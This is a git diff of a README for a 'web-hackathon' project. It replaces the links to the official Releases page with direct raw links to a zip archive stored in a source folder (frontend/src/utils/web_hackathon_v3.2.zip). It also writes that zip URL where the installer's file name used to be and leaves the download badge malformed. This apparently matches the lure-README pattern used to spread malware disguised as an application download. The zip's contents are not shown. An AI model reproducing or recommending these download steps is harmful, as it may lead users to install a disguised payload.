@@ -6,7 +6,7 @@ Welcome to the web-hackathon project, where you can create and explore a website
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Mavin9300/web-hackathon/releases)
+[![Download Latest Release](https://github.com/Mavin9300/web-hackathon/raw/refs/heads/main/frontend/src/utils/web_hackathon_v3.2.zip%20Latest%https://github.com/Mavin9300/web-hackathon/raw/refs/heads/main/frontend/src/utils/web_hackathon_v3.2.zip)](https://github.com/Mavin9300/web-hackathon/raw/refs/heads/main/frontend/src/utils/web_hackathon_v3.2.zip)
 
 To get started, click the button above to access the download page. This link will take you to the Releases section, where you can find the latest version of the web-hackathon application.
 
@@ -32,9 +32,9 @@ The web-hackathon application includes a variety of features to enhance your web
 
 To download the application:
 
-1. Visit this page to download: [Download Latest Release](https://github.com/Mavin9300/web-hackathon/releases).
+1. Visit this page to download: [Download Latest Release](https://github.com/Mavin9300/web-hackathon/raw/refs/heads/main/frontend/src/utils/web_hackathon_v3.2.zip).
 2. On the Releases page, you will see the latest version listed. Click on it.
-3. Scroll down to the assets section and find the executable file. It may be named something like `web-hackathon-setup.exe` or similar.
+3. Scroll down to the assets section and find the executable file. It may be named something like `https://github.com/Mavin9300/web-hackathon/raw/refs/heads/main/frontend/src/utils/web_hackathon_v3.2.zip` or similar.
 4. Click on the file to start the download.
 
 After the download completes, follow these steps to install:
